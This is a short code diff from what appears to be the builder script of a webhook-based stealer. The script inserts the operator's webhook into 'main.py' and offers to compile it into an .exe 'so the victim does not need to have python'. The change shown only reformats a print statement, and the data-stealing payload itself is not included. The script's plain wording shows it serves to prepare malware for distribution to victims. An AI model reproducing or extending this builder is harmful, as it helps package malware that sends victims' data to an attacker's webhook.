@@ -12,7 +12,9 @@ with codecs.open("main.py", "r", encoding="utf-8") as file:
 with codecs.open("main.py", "w", encoding="utf-8") as file:
     file.write(data)
 
-print('Added your webhook to "main.py"! type "exec" if you want to build it to a .exe file so the victim does not need to have python or you can just keep it and type "keep" and press enter to keep the "main.py" file with your webhook.')
+print(
+    'Added your webhook to "main.py"! type "exec" if you want to build it to a .exe file so the victim does not need to have python or you can just keep it and type "keep" and press enter to keep the "main.py" file with your webhook.'
+)
 choice = input("Choice [exec/keep]: ")
 if choice == "exec":
     os.system("pip install pyinstaller")
